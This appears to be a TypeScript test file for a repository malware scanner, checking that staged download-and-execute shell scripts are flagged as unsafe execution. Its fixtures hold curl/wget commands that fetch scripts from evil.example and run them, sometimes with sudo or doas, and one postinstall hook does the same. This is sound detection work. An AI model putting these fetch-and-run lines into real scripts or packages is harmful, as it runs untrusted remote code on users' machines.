import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8 requires the bounded malicious-code scan to flag unsafe
 * execution. A download piped into a shell is one act; saving the
 * download to a path and running that path later in the same file is
 * the same act in two steps. Each step alone is already reviewed (the
 * download is collected, running a local file is ordinary), so the
 * staged forms below are flagged only because the execution names the
 * exact path the download wrote.
 */
function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

function categories(inspection: ReturnType<typeof inspected>) {
  return inspection.findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

const STAGED: Record<string, [string, string]> = {
  "curl -o an absolute path, run with sh": [
    "install.sh",
    "#!/bin/sh\ncurl -o /tmp/x.sh https://evil.example/x.sh\nsh /tmp/x.sh\n",
  ],
  "curl -o, chmod +x, then ./": [
    "install.sh",
    "#!/bin/sh\ncurl -fsSL -o x.sh https://evil.example/x.sh\nchmod +x x.sh\n./x.sh\n",
  ],
  "wget -O, run with bash": [
    "install.sh",
    "#!/bin/sh\nwget -q -O x.sh https://evil.example/x.sh\nbash x.sh\n",
  ],
  "curl -o an extensionless tool, run as ./tool": [
    "install.sh",
    "#!/bin/sh\ncurl -fsSL https://evil.example/tool -o tool\n./tool --setup\n",
  ],
  "download and execution chained on one line": [
    "install.sh",
    "#!/bin/sh\ncurl -o x.sh https://evil.example/x.sh && sh x.sh\n",
  ],
  "curl redirected to a file, run with sh": [
    "install.sh",
    "#!/bin/sh\ncurl -fsSL https://evil.example/x.sh > x.sh\nsh x.sh\n",
  ],
  "wget -O a Python file, run with python3": [
    "install.sh",
    "#!/bin/sh\nwget -O x.py https://evil.example/x.py\npython3 x.py\n",
  ],
  "curl --output= form": [
    "install.sh",
    "#!/bin/sh\ncurl --output=x.sh https://evil.example/x.sh\nbash x.sh\n",
  ],
  "wget --output-document form": [
    "install.sh",
    "#!/bin/sh\nwget --output-document x.sh https://evil.example/x.sh\nsh x.sh\n",
  ],
  "quoted download path, quoted execution": [
    "install.sh",
    '#!/bin/sh\ncurl -o "x.sh" https://evil.example/x.sh\nsh "x.sh"\n',
  ],
  "run with sudo sh": [
    "install.sh",
    "#!/bin/sh\ncurl -o /tmp/x.sh https://evil.example/x.sh\nsudo sh /tmp/x.sh\n",
  ],
  "run with doas sh": [
    "install.sh",
    "#!/bin/sh\ncurl -o /tmp/x.sh https://evil.example/x.sh\ndoas sh /tmp/x.sh\n",
  ],
  "run with doas -u root sh": [
    "install.sh",
    "#!/bin/sh\ncurl -o /tmp/x.sh https://evil.example/x.sh\ndoas -u root sh /tmp/x.sh\n",
  ],
  "downloaded into a subdirectory, run as ./sub/x.sh": [
    "install.sh",
    "#!/bin/sh\ncurl -o sub/x.sh https://evil.example/x.sh\n./sub/x.sh\n",
  ],
};

test("a download staged to a path and run later in the same file is unsafe execution", () => {
  for (const [name, [path, body]] of Object.entries(STAGED)) {
    expect({ name, findings: categories(inspected(path, body)) }).toEqual({
      name,
      findings: [`${path}:unsafe-execution:high`],
    });
  }
});

test("a staged download executed in an install hook is install content", () => {
  const inspection = inspected(
    "package.json",
    '{"scripts":{"postinstall":"curl -o x.sh https://evil.example/x.sh && ./x.sh"}}\n',
  );
  // The extracted hook is executable content; the JSON wrapper is data.
  expect(categories(inspection)).toEqual([
    "package.json#scripts:unsafe-execution:high",
  ]);
});

test("a staged download that is not executed keeps no finding", () => {
  for (const [path, body] of [
    // Verified against a checksum and nothing more.
    [
      "install.sh",
      "#!/bin/sh\ncurl -o x.sh https://example.com/x.sh\nsha256sum x.sh\n",
    ],
    // A data artifact that is only read.
    [
      "install.sh",
      "#!/bin/sh\ncurl -o data.json https://example.com/data.json\ncat data.json\njq . data.json\n",
    ],
    // Downloading alone, and making the file executable, runs nothing.
    [
      "install.sh",
      "#!/bin/sh\ncurl -o x.sh https://example.com/x.sh\nchmod +x x.sh\necho done\n",
    ],
    // The path is only mentioned, inside echo text.
    [
      "install.sh",
      '#!/bin/sh\ncurl -o x.sh https://example.com/x.sh\necho "to run it later: sh x.sh"\n',
    ],
  ] as const) {
    expect({ path, findings: categories(inspected(path, body)) }).toEqual({
      path,
      findings: [],
    });
  }
});

test("an execution the download does not stage keeps no finding", () => {
  for (const [path, body] of [
    // A pre-existing local script runs; the download is data.
    [
      "install.sh",
      "#!/bin/sh\ncurl -o data.bin https://example.com/data.bin\nsh scripts/local.sh\n",
    ],
    // Downloaded to one path, a different path runs.
    [
      "install.sh",
      "#!/bin/sh\ncurl -o a.sh https://example.com/a.sh\n./b.sh\n",
    ],
    // The execution comes first; only a later execution would link.
    [
      "install.sh",
      "#!/bin/sh\nsh x.sh\ncurl -o x.sh https://example.com/x.sh\n",
    ],
    // `wget -o` names a log file, not the download.
    [
      "install.sh",
      "#!/bin/sh\nwget -o x.sh https://example.com/page.html\nsh x.sh\n",
    ],
    // A variable path is not one literal token.
    [
      "install.sh",
      "#!/bin/sh\ncurl -o $TMPDIR/x.sh https://evil.example/x.sh\nsh $TMPDIR/x.sh\n",
    ],
  ] as const) {
    expect({ path, findings: categories(inspected(path, body)) }).toEqual({
      path,
      findings: [],
    });
  }
});

test("a download in one file and an execution in another stay unlinked", () => {
  const inspection = inspectRepository({
    files: [
      {
        path: "install.sh",
        bytes: new TextEncoder().encode(
          "#!/bin/sh\ncurl -o x.sh https://evil.example/x.sh\n",
        ),
      },
      {
        path: "setup.sh",
        bytes: new TextEncoder().encode("#!/bin/sh\n./x.sh\n"),
      },
    ],
  });
  expect(categories(inspection)).toEqual([]);
});

test("quoted data, PATH lookups and non-executing flags do not link a download", () => {
  for (const body of [
    "curl -o x.sh https://example.com/x.sh\nsh -n x.sh",
    "curl -o x.py https://example.com/x.py\npython3 -V x.py",
    "curl -o tool https://example.com/tool\ntool",
    'echo "curl -o x.sh https://example.com/x.sh"\nsh x.sh',
    'curl -o x.sh https://example.com/x.sh\necho "x.sh"',
  ]) {
    expect({
      body,
      findings: categories(inspected("install.sh", body)),
    }).toEqual({ body, findings: [] });
  }
});
